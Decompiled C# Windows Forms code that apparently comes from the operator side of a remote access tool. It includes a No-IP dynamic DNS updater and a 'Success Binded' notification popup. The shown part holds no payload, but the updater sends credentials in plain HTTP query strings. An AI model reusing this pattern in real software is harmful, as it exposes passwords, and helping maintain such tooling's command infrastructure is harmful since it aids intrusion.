			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(NO_IP));
			this.Label4 = new Label();
			this.Label1 = new Label();
			this.Label3 = new Label();
			this.Label2 = new Label();
			this.LogInRichTextBox5 = new LogInRichTextBox();
			this.VisualStudioTabControl1 = new VisualStudioTabControl();
			this.TabPage1 = new TabPage();
			this.LogInRichTextBox1 = new LogInRichTextBox();
			this.Button1 = new Button();
			this.TextBox1 = new LogInRichTextBox();
			this.PictureBox2 = new PictureBox();
			this.TextBox2 = new LogInRichTextBox();
			this.RichTextBox1 = new RichTextBox();
			this.TextBox3 = new LogInRichTextBox();
			this.LogInRichTextBox4 = new LogInRichTextBox();
			this.Button3 = new Button();
			this.LogInRichTextBox3 = new LogInRichTextBox();
			this.LogInRichTextBox2 = new LogInRichTextBox();
			this.TabPage2 = new TabPage();
			this.LogInLabel1 = new LogInLabel();
			this.VisualStudioTabControl1.SuspendLayout();
			this.TabPage1.SuspendLayout();
			((ISupportInitialize)this.PictureBox2).BeginInit();
			this.SuspendLayout();
			this.Label4.AutoSize = true;
			this.Label4.BackColor = Color.Transparent;
			this.Label4.Font = new Font("Microsoft Sans Serif", 24f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label4.ForeColor = Color.Red;
			Control arg_192_0 = this.Label4;
			Point location = new Point(246, 440);
			arg_192_0.Location = location;
			this.Label4.Name = "Label4";
			Control arg_1C0_0 = this.Label4;
			Size size = new Size(229, 37);
			arg_1C0_0.Size = size;
			this.Label4.TabIndex = 18;
			this.Label4.Text = "NO-IP Update";
			this.Label1.AutoSize = true;
			this.Label1.BackColor = Color.Transparent;
			this.Label1.Font = new Font("Tahoma", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label1.ForeColor = Color.Silver;
			Control arg_24B_0 = this.Label1;
			location = new Point(569, 463);
			arg_24B_0.Location = location;
			this.Label1.Name = "Label1";
			Control arg_276_0 = this.Label1;
			size = new Size(38, 14);
			arg_276_0.Size = size;
			this.Label1.TabIndex = 34;
			this.Label1.Text = "Email";
			this.Label3.AutoSize = true;
			this.Label3.BackColor = Color.Transparent;
			this.Label3.Font = new Font("Tahoma", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label3.ForeColor = Color.Silver;
			Control arg_301_0 = this.Label3;
			location = new Point(527, 463);
			arg_301_0.Location = location;
			this.Label3.Name = "Label3";
			Control arg_32C_0 = this.Label3;
			size = new Size(36, 14);
			arg_32C_0.Size = size;
			this.Label3.TabIndex = 36;
			this.Label3.Text = "Host";
			this.Label2.AutoSize = true;
			this.Label2.BackColor = Color.Transparent;
			this.Label2.Font = new Font("Tahoma", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label2.ForeColor = Color.Silver;
			Control arg_3B7_0 = this.Label2;
			location = new Point(613, 463);
			arg_3B7_0.Location = location;
			this.Label2.Name = "Label2";
			Control arg_3E2_0 = this.Label2;
			size = new Size(34, 14);
			arg_3E2_0.Size = size;
			this.Label2.TabIndex = 38;
			this.Label2.Text = "Pass";
			this.LogInRichTextBox5.BaseColour = Color.FromArgb(42, 42, 42);
			this.LogInRichTextBox5.BorderColour = Color.FromArgb(35, 35, 35);
			Control arg_44B_0 = this.LogInRichTextBox5;
			location = new Point(545, 41);
			arg_44B_0.Location = location;
			this.LogInRichTextBox5.Name = "LogInRichTextBox5";
			Control arg_479_0 = this.LogInRichTextBox5;
			size = new Size(162, 30);
			arg_479_0.Size = size;
			this.LogInRichTextBox5.TabIndex = 108;
			this.LogInRichTextBox5.TextColour = Color.FromArgb(255, 255, 255);
			this.VisualStudioTabControl1.ActiveColour = Color.FromArgb(0, 122, 204);
			this.VisualStudioTabControl1.AllowDrop = true;
			this.VisualStudioTabControl1.BackTabColour = Color.FromArgb(28, 28, 28);
			this.VisualStudioTabControl1.BaseColour = Color.FromArgb(45, 45, 48);
			this.VisualStudioTabControl1.BorderColour = Color.FromArgb(30, 30, 30);
			this.VisualStudioTabControl1.Controls.Add(this.TabPage1);
			this.VisualStudioTabControl1.Controls.Add(this.TabPage2);
			this.VisualStudioTabControl1.HorizontalLineColour = Color.FromArgb(0, 122, 204);
			TabControl arg_576_0 = this.VisualStudioTabControl1;
			size = new Size(240, 16);
			arg_576_0.ItemSize = size;
			Control arg_58E_0 = this.VisualStudioTabControl1;
			location = new Point(-1, -32);
			arg_58E_0.Location = location;
			this.VisualStudioTabControl1.Name = "VisualStudioTabControl1";
			this.VisualStudioTabControl1.SelectedIndex = 0;
			Control arg_5CC_0 = this.VisualStudioTabControl1;
			size = new Size(402, 179);
			arg_5CC_0.Size = size;
			this.VisualStudioTabControl1.TabIndex = 112;
			this.VisualStudioTabControl1.TextColour = Color.FromArgb(255, 255, 255);
			this.TabPage1.BackColor = Color.FromArgb(28, 28, 28);
			this.TabPage1.Controls.Add(this.LogInRichTextBox1);
			this.TabPage1.Controls.Add(this.Button1);
			this.TabPage1.Controls.Add(this.TextBox1);
			this.TabPage1.Controls.Add(this.PictureBox2);
			this.TabPage1.Controls.Add(this.TextBox2);
			this.TabPage1.Controls.Add(this.RichTextBox1);
			this.TabPage1.Controls.Add(this.TextBox3);
			this.TabPage1.Controls.Add(this.LogInRichTextBox4);
			this.TabPage1.Controls.Add(this.Button3);
			this.TabPage1.Controls.Add(this.LogInRichTextBox3);
			this.TabPage1.Controls.Add(this.LogInRichTextBox2);
			TabPage arg_726_0 = this.TabPage1;
			location = new Point(4, 20);
			arg_726_0.Location = location;
			this.TabPage1.Name = "TabPage1";
			Control arg_74E_0 = this.TabPage1;
			Padding padding = new Padding(3);
			arg_74E_0.Padding = padding;
			Control arg_76E_0 = this.TabPage1;
			size = new Size(394, 155);
			arg_76E_0.Size = size;
			this.TabPage1.TabIndex = 0;
			this.TabPage1.Text = "TabPage1";
			this.LogInRichTextBox1.BaseColour = Color.FromArgb(42, 42, 42);
			this.LogInRichTextBox1.BorderColour = Color.FromArgb(35, 35, 35);
			this.LogInRichTextBox1.ForeColor = Color.LightSteelBlue;
			Control arg_7E3_0 = this.LogInRichTextBox1;
			location = new Point(6, 25);
			arg_7E3_0.Location = location;
			this.LogInRichTextBox1.Name = "LogInRichTextBox1";
			Control arg_80E_0 = this.LogInRichTextBox1;
			size = new Size(68, 30);
			arg_80E_0.Size = size;
			this.LogInRichTextBox1.TabIndex = 104;
			this.LogInRichTextBox1.Text = "Email";
			this.LogInRichTextBox1.TextColour = Color.FromArgb(255, 255, 255);
			this.Button1.BackColor = Color.FromArgb(28, 28, 28);
			this.Button1.Cursor = Cursors.Hand;
			this.Button1.FlatStyle = FlatStyle.Flat;
			this.Button1.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button1.ForeColor = Color.LightSteelBlue;
			Control arg_8CD_0 = this.Button1;
			location = new Point(303, 110);
			arg_8CD_0.Location = location;
			this.Button1.Name = "Button1";
			Control arg_8F8_0 = this.Button1;
			size = new Size(80, 26);
			arg_8F8_0.Size = size;
			this.Button1.TabIndex = 111;
			this.Button1.Text = "Color";
			this.Button1.UseVisualStyleBackColor = false;
			this.TextBox1.BaseColour = Color.FromArgb(42, 42, 42);
			this.TextBox1.BorderColour = Color.FromArgb(35, 35, 35);
			this.TextBox1.ForeColor = Color.LightSteelBlue;
			Control arg_97C_0 = this.TextBox1;
			location = new Point(68, 25);
			arg_97C_0.Location = location;
			this.TextBox1.Name = "TextBox1";
			Control arg_9AA_0 = this.TextBox1;
			size = new Size(235, 30);
			arg_9AA_0.Size = size;
			this.TextBox1.TabIndex = 32;
			this.TextBox1.TextColour = Color.FromArgb(255, 255, 255);
			this.PictureBox2.BackColor = Color.Transparent;
			this.PictureBox2.Image = (Image)componentResourceManager.GetObject("PictureBox2.Image");
			Control arg_A21_0 = this.PictureBox2;
			location = new Point(309, 39);
			arg_A21_0.Location = location;
			this.PictureBox2.Name = "PictureBox2";
			Control arg_A4C_0 = this.PictureBox2;
			size = new Size(58, 50);
			arg_A4C_0.Size = size;
			this.PictureBox2.SizeMode = PictureBoxSizeMode.StretchImage;
			this.PictureBox2.TabIndex = 110;
			this.PictureBox2.TabStop = false;
			this.TextBox2.BaseColour = Color.FromArgb(42, 42, 42);
			this.TextBox2.BorderColour = Color.FromArgb(35, 35, 35);
			this.TextBox2.ForeColor = Color.LightSteelBlue;
			Control arg_ACC_0 = this.TextBox2;
			location = new Point(68, 51);
			arg_ACC_0.Location = location;
			this.TextBox2.Name = "TextBox2";
			Control arg_AFA_0 = this.TextBox2;
			size = new Size(235, 30);
			arg_AFA_0.Size = size;
			this.TextBox2.TabIndex = 33;
			this.TextBox2.TextColour = Color.FromArgb(255, 255, 255);
			Control arg_B47_0 = this.RichTextBox1;
			location = new Point(265, 227);
			arg_B47_0.Location = location;
			this.RichTextBox1.Name = "RichTextBox1";
			Control arg_B71_0 = this.RichTextBox1;
			size = new Size(76, 8);
			arg_B71_0.Size = size;
			this.RichTextBox1.TabIndex = 109;
			this.RichTextBox1.Text = "";
			this.RichTextBox1.Visible = false;
			this.TextBox3.BaseColour = Color.FromArgb(42, 42, 42);
			this.TextBox3.BorderColour = Color.FromArgb(35, 35, 35);
			this.TextBox3.ForeColor = Color.LightSteelBlue;
			Control arg_BF5_0 = this.TextBox3;
			location = new Point(68, 74);
			arg_BF5_0.Location = location;
			this.TextBox3.Name = "TextBox3";
			Control arg_C23_0 = this.TextBox3;
			size = new Size(235, 30);
			arg_C23_0.Size = size;
			this.TextBox3.TabIndex = 39;
			this.TextBox3.TextColour = Color.FromArgb(255, 255, 255);
			this.LogInRichTextBox4.BaseColour = Color.FromArgb(42, 42, 42);
			this.LogInRichTextBox4.BorderColour = Color.FromArgb(35, 35, 35);
			Control arg_C9B_0 = this.LogInRichTextBox4;
			location = new Point(299, 25);
			arg_C9B_0.Location = location;
			this.LogInRichTextBox4.Name = "LogInRichTextBox4";
			Control arg_CC6_0 = this.LogInRichTextBox4;
			size = new Size(85, 79);
			arg_CC6_0.Size = size;
			this.LogInRichTextBox4.TabIndex = 107;
			this.LogInRichTextBox4.TextColour = Color.FromArgb(255, 255, 255);
			this.Button3.BackColor = Color.FromArgb(28, 28, 28);
			this.Button3.Cursor = Cursors.Hand;
			this.Button3.FlatStyle = FlatStyle.Flat;
			this.Button3.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button3.ForeColor = Color.LightSteelBlue;
			Control arg_D70_0 = this.Button3;
			location = new Point(6, 110);
			arg_D70_0.Location = location;
			this.Button3.Name = "Button3";
			Control arg_D9E_0 = this.Button3;
			size = new Size(297, 26);
			arg_D9E_0.Size = size;
			this.Button3.TabIndex = 103;
			this.Button3.Text = "OK";
			this.Button3.UseVisualStyleBackColor = false;
			this.LogInRichTextBox3.BaseColour = Color.FromArgb(42, 42, 42);
			this.LogInRichTextBox3.BorderColour = Color.FromArgb(35, 35, 35);
			this.LogInRichTextBox3.ForeColor = Color.LightSteelBlue;
			Control arg_E21_0 = this.LogInRichTextBox3;
			location = new Point(6, 74);
			arg_E21_0.Location = location;
			this.LogInRichTextBox3.Name = "LogInRichTextBox3";
			Control arg_E4C_0 = this.LogInRichTextBox3;
			size = new Size(68, 30);
			arg_E4C_0.Size = size;
			this.LogInRichTextBox3.TabIndex = 106;
			this.LogInRichTextBox3.Text = "Host";
			this.LogInRichTextBox3.TextColour = Color.FromArgb(255, 255, 255);
			this.LogInRichTextBox2.BaseColour = Color.FromArgb(42, 42, 42);
			this.LogInRichTextBox2.BorderColour = Color.FromArgb(35, 35, 35);
			this.LogInRichTextBox2.ForeColor = Color.LightSteelBlue;
			Control arg_EE2_0 = this.LogInRichTextBox2;
			location = new Point(6, 51);
			arg_EE2_0.Location = location;
			this.LogInRichTextBox2.Name = "LogInRichTextBox2";
			Control arg_F0D_0 = this.LogInRichTextBox2;
			size = new Size(68, 30);
			arg_F0D_0.Size = size;
			this.LogInRichTextBox2.TabIndex = 105;
			this.LogInRichTextBox2.Text = "Password";
			this.LogInRichTextBox2.TextColour = Color.FromArgb(255, 255, 255);
			this.TabPage2.BackColor = Color.FromArgb(28, 28, 28);
			TabPage arg_F7B_0 = this.TabPage2;
			location = new Point(4, 20);
			arg_F7B_0.Location = location;
			this.TabPage2.Name = "TabPage2";
			Control arg_FA3_0 = this.TabPage2;
			padding = new Padding(3);
			arg_FA3_0.Padding = padding;
			Control arg_FC3_0 = this.TabPage2;
			size = new Size(394, 155);
			arg_FC3_0.Size = size;
			this.TabPage2.TabIndex = 1;
			this.TabPage2.Text = "TabPage2";
			this.LogInLabel1.AutoSize = true;
			this.LogInLabel1.BackColor = Color.Transparent;
			this.LogInLabel1.Font = new Font("Segoe UI", 9f);
			this.LogInLabel1.FontColour = Color.FromArgb(255, 255, 255);
			this.LogInLabel1.ForeColor = Color.FromArgb(255, 255, 255);
			Control arg_1079_0 = this.LogInLabel1;
			location = new Point(680, 462);
			arg_1079_0.Location = location;
			this.LogInLabel1.Name = "LogInLabel1";
			Control arg_10A4_0 = this.LogInLabel1;
			size = new Size(71, 15);
			arg_10A4_0.Size = size;
			this.LogInLabel1.TabIndex = 37;
			this.LogInLabel1.Text = "LogInLabel1";
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.AutoValidate = AutoValidate.EnablePreventFocusChange;
			this.BackColor = Color.Black;
			size = new Size(390, 128);
			this.ClientSize = size;
			this.Controls.Add(this.LogInRichTextBox5);
			this.Controls.Add(this.VisualStudioTabControl1);
			this.Controls.Add(this.Label2);
			this.Controls.Add(this.LogInLabel1);
			this.Controls.Add(this.Label1);
			this.Controls.Add(this.Label3);
			this.Controls.Add(this.Label4);
			this.ForeColor = Color.DeepSkyBlue;
			this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			size = new Size(406, 162);
			this.MaximumSize = size;
			size = new Size(406, 162);
			this.MinimumSize = size;
			this.Name = "NO_IP";
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "NO_IP";
			this.TransparencyKey = Color.Fuchsia;
			this.VisualStudioTabControl1.ResumeLayout(false);
			this.TabPage1.ResumeLayout(false);
			((ISupportInitialize)this.PictureBox2).EndInit();
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		private void Button1_Click(object sender, EventArgs e)
		{
		}

		private void NO_IP_Load(object sender, EventArgs e)
		{
			this.Text = "NO_IP DUC: " + Environment.MachineName + "\\@" + Environment.UserName;
			try
			{
				string empty = string.Empty;
				string[] array = Strings.Split(empty, "\r\n", -1, CompareMethod.Binary);
			}
			catch (Exception expr_38)
			{
				ProjectData.SetProjectError(expr_38);
				ProjectData.ClearProjectError();
			}
		}

		private void CheckBox2_CheckedChanged(object sender, EventArgs e)
		{
		}

		private void CheckBox1_CheckedChanged(object sender, EventArgs e)
		{
		}

		private void NyX_Button1_Click(object sender, EventArgs e)
		{
		}

		private void NyX_Theme1_Click(object sender, EventArgs e)
		{
		}

		private void Button3_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			try
			{
				string @string = uTF8Encoding.GetString(webClient.DownloadData(string.Concat(new string[]
				{
					"http://dynupdate.no-ip.com/dns?username=",
					this.TextBox1.Text,
					"&password=",
					this.TextBox2.Text,
					"&hostname=",
					this.TextBox3.Text
				})));
				string[] array = @string.Split(new char[]
				{
					':'
				});
				this.RichTextBox1.Text = array[1];
				bool flag = array[1].Contains("0");
				if (flag)
				{
					Interaction.MsgBox("Success - IP address is current, no update performed", MsgBoxStyle.Information, null);
				}
				flag = array[1].Contains("1");
				if (flag)
				{
					Interaction.MsgBox("Success - DNS hostname update successful", MsgBoxStyle.Information, null);
				}
				flag = array[1].Contains("2");
				if (flag)
				{
					Interaction.MsgBox("Error - Hostname supplied does not exist", MsgBoxStyle.Critical, null);
				}
				flag = array[1].Contains("3");
				if (flag)
				{
					Interaction.MsgBox("Error - Invalid username", MsgBoxStyle.Critical, null);
				}
				flag = array[1].Contains("4");
				if (flag)
				{
					Interaction.MsgBox("Error - Invalid password", MsgBoxStyle.Critical, null);
				}
				flag = array[1].Contains("5");
				if (flag)
				{
					Interaction.MsgBox("Error - Too many updates sent. Updates are blocked   until 1 hour passes since last status of 5 returned.", MsgBoxStyle.Critical, null);
				}
				flag = array[1].Contains("6");
				if (flag)
				{
					Interaction.MsgBox("Error - Account disabled due to violation of No-IP   terms of service. Our terms of service can be viewed at   http://www.no-ip.com/legal/tos", MsgBoxStyle.Critical, null);
				}
				flag = array[1].Contains("7");
				if (flag)
				{
					Interaction.MsgBox("Error - Invalid IP. Invalid IP submitted is   improperly formated, is a private LAN RFC 1918 address, or an abuse   blacklisted address.", MsgBoxStyle.Critical, null);
				}
				flag = array[1].Contains("8");
				if (flag)
				{
					Interaction.MsgBox("Error - Disabled / Locked hostname", MsgBoxStyle.Critical, null);
				}
				flag = array[1].Contains("9");
				if (flag)
				{
					Interaction.MsgBox("Host updated is configured as a web redirect and no update was performed.", MsgBoxStyle.Information, null);
				}
				flag = array[1].Contains("10");
				if (flag)
				{
					Interaction.MsgBox("Error - Group supplied does not exist", MsgBoxStyle.Critical, null);
				}
				flag = array[1].Contains("11");
				if (flag)
				{
					Interaction.MsgBox("Success - DNS group update is successful", MsgBoxStyle.Information, null);
				}
				flag = array[1].Contains("12");
				if (flag)
				{
					Interaction.MsgBox("Success - DNS group is current, no update performed.", MsgBoxStyle.Information, null);
				}
				flag = array[1].Contains("13");
				if (flag)
				{
					Interaction.MsgBox("Error - Update client support not available for supplied hostname or group", MsgBoxStyle.Critical, null);
				}
				flag = array[1].Contains("14");
				if (flag)
				{
					Interaction.MsgBox("Error - Hostname supplied does not have offline   settings configured. Returned if sending offline=YES on a host that  does  not have any offline actions configured.", MsgBoxStyle.Critical, null);
				}
				flag = array[1].Contains("99");
				if (flag)
				{
					Interaction.MsgBox("Error - Client disabled. Client should exit and not   perform any more updates without user intervention.", MsgBoxStyle.Critical, null);
				}
				flag = array[1].Contains("100");
				if (flag)
				{
					Interaction.MsgBox("Error - User input error usually returned if missing required request parameters", MsgBoxStyle.Critical, null);
				}
			}
			catch (Exception expr_2E2)
			{
				ProjectData.SetProjectError(expr_2E2);
				Interaction.MsgBox("Check your Internet Connection", MsgBoxStyle.Exclamation, "NO-IP Updater");
				ProjectData.ClearProjectError();
			}
		}

		private void Button1_Click_1(object sender, EventArgs e)
		{
			ColorDialog colorDialog = new ColorDialog();
			colorDialog.ShowDialog();
			this.TabPage1.BackColor = colorDialog.Color;
		}
	}
}

using Microsoft.VisualBasic.CompilerServices;
using nj.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class NOTIF : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("Panel3")]
		private Panel _Panel3;

		[AccessedThroughProperty("Label4")]
		private Label _Label4;

		[AccessedThroughProperty("T1")]
		private Timer _T1;

		[AccessedThroughProperty("T2")]
		private Timer _T2;

		[AccessedThroughProperty("T3")]
		private Timer _T3;

		[AccessedThroughProperty("Panel2")]
		private Panel _Panel2;

		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		[AccessedThroughProperty("Label6")]
		private Label _Label6;

		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		[AccessedThroughProperty("Label5")]
		private Label _Label5;

		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		[AccessedThroughProperty("Label7")]
		private Label _Label7;

		[AccessedThroughProperty("lbl_Title")]
		private Label _lbl_Title;

		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		private int inn;

		internal virtual Panel Panel3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				PaintEventHandler value2 = new PaintEventHandler(this.Panel3_Paint);
				bool flag = this._Panel3 != null;
				if (flag)
				{
					this._Panel3.Paint -= value2;
				}
				this._Panel3 = value;
				flag = (this._Panel3 != null);
				if (flag)
				{
					this._Panel3.Paint += value2;
				}
			}
		}

		internal virtual Label Label4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label4 = value;
			}
		}

		internal virtual Timer T1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.T1_Tick);
				bool flag = this._T1 != null;
				if (flag)
				{
					this._T1.Tick -= value2;
				}
				this._T1 = value;
				flag = (this._T1 != null);
				if (flag)
				{
					this._T1.Tick += value2;
				}
			}
		}

		internal virtual Timer T2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.T2_Tick);
				bool flag = this._T2 != null;
				if (flag)
				{
					this._T2.Tick -= value2;
				}
				this._T2 = value;
				flag = (this._T2 != null);
				if (flag)
				{
					this._T2.Tick += value2;
				}
			}
		}

		internal virtual Timer T3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.T3_Tick);
				bool flag = this._T3 != null;
				if (flag)
				{
					this._T3.Tick -= value2;
				}
				this._T3 = value;
				flag = (this._T3 != null);
				if (flag)
				{
					this._T3.Tick += value2;
				}
			}
		}

		internal virtual Panel Panel2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				PaintEventHandler value2 = new PaintEventHandler(this.Panel2_Paint);
				EventHandler value3 = new EventHandler(this.Panel2_Click);
				bool flag = this._Panel2 != null;
				if (flag)
				{
					this._Panel2.Paint -= value2;
					this._Panel2.Click -= value3;
				}
				this._Panel2 = value;
				flag = (this._Panel2 != null);
				if (flag)
				{
					this._Panel2.Paint += value2;
					this._Panel2.Click += value3;
				}
			}
		}

		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		internal virtual Label Label6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label6 = value;
			}
		}

		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		internal virtual Label Label5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label5 = value;
			}
		}

		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label3 = value;
			}
		}

		internal virtual Label Label7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label7 = value;
			}
		}

		internal virtual Label lbl_Title
		{
			[DebuggerNonUserCode]
			get
			{
				return this._lbl_Title;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._lbl_Title = value;
			}
		}

		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = NOTIF.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = NOTIF.__ENCList.Count == NOTIF.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = NOTIF.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = NOTIF.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									NOTIF.__ENCList[num] = NOTIF.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						NOTIF.__ENCList.RemoveRange(num, NOTIF.__ENCList.Count - num);
						NOTIF.__ENCList.Capacity = NOTIF.__ENCList.Count;
					}
					NOTIF.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(NOTIF));
			this.Panel3 = new Panel();
			this.Label4 = new Label();
			this.T1 = new Timer(this.components);
			this.T2 = new Timer(this.components);
			this.T3 = new Timer(this.components);
			this.Panel2 = new Panel();
			this.lbl_Title = new Label();
			this.Label7 = new Label();
			this.Label2 = new Label();
			this.Label6 = new Label();
			this.Label1 = new Label();
			this.Label5 = new Label();
			this.Label3 = new Label();
			this.Timer1 = new Timer(this.components);
			this.Panel3.SuspendLayout();
			this.Panel2.SuspendLayout();
			this.SuspendLayout();
			this.Panel3.BackColor = Color.DarkOliveGreen;
			this.Panel3.Controls.Add(this.Label4);
			Control arg_135_0 = this.Panel3;
			Point location = new Point(3, 91);
			arg_135_0.Location = location;
			this.Panel3.Name = "Panel3";
			Control arg_166_0 = this.Panel3;
			Size size = new Size(177, 148);
			arg_166_0.Size = size;
			this.Panel3.TabIndex = 0;
			this.Label4.AutoSize = true;
			this.Label4.BackColor = Color.Transparent;
			this.Label4.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label4.ForeColor = Color.White;
			Control arg_1D8_0 = this.Label4;
			location = new Point(36, 1);
			arg_1D8_0.Location = location;
			this.Label4.Name = "Label4";
			Control arg_202_0 = this.Label4;
			size = new Size(0, 15);
			arg_202_0.Size = size;
			this.Label4.TabIndex = 0;
			this.T1.Enabled = true;
			this.T1.Interval = 15;
			this.T2.Interval = 15;
			this.T3.Interval = 5000;
			this.Panel2.BackColor = Color.FromArgb(40, 40, 40);
			this.Panel2.BackgroundImage = (Image)componentResourceManager.GetObject("Panel2.BackgroundImage");
			this.Panel2.BorderStyle = BorderStyle.FixedSingle;
			this.Panel2.Controls.Add(this.lbl_Title);
			Control arg_2B8_0 = this.Panel2;
			location = new Point(3, 91);
			arg_2B8_0.Location = location;
			this.Panel2.Name = "Panel2";
			Control arg_2E9_0 = this.Panel2;
			size = new Size(177, 148);
			arg_2E9_0.Size = size;
			this.Panel2.TabIndex = 1;
			this.lbl_Title.AutoSize = true;
			this.lbl_Title.BackColor = Color.Transparent;
			this.lbl_Title.Font = new Font("Impact", 12f, FontStyle.Underline, GraphicsUnit.Point, 0);
			this.lbl_Title.ForeColor = Color.SteelBlue;
			Control arg_35C_0 = this.lbl_Title;
			location = new Point(34, 71);
			arg_35C_0.Location = location;
			this.lbl_Title.Name = "lbl_Title";
			Control arg_387_0 = this.lbl_Title;
			size = new Size(113, 20);
			arg_387_0.Size = size;
			this.lbl_Title.TabIndex = 40;
			this.lbl_Title.Text = "Success Binded";
			this.Label7.AutoSize = true;
			this.Label7.BackColor = Color.Transparent;
			this.Label7.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.Label7.ForeColor = Color.White;
			Control arg_412_0 = this.Label7;
			location = new Point(252, 316);
			arg_412_0.Location = location;
			this.Label7.Name = "Label7";
			Control arg_43D_0 = this.Label7;
			size = new Size(11, 15);
			arg_43D_0.Size = size;
			this.Label7.TabIndex = 5;
			this.Label7.Text = "-";
			this.Label2.AutoSize = true;
			this.Label2.BackColor = Color.Transparent;
			this.Label2.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.Label2.ForeColor = Color.White;
			Control arg_4C4_0 = this.Label2;
			location = new Point(106, 316);
			arg_4C4_0.Location = location;
			this.Label2.Name = "Label2";
			Control arg_4EF_0 = this.Label2;
			size = new Size(29, 15);
			arg_4EF_0.Size = size;
			this.Label2.TabIndex = 4;
			this.Label2.Text = "PC :";
			this.Label6.AutoSize = true;
			this.Label6.BackColor = Color.Transparent;
			this.Label6.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.Label6.ForeColor = Color.White;
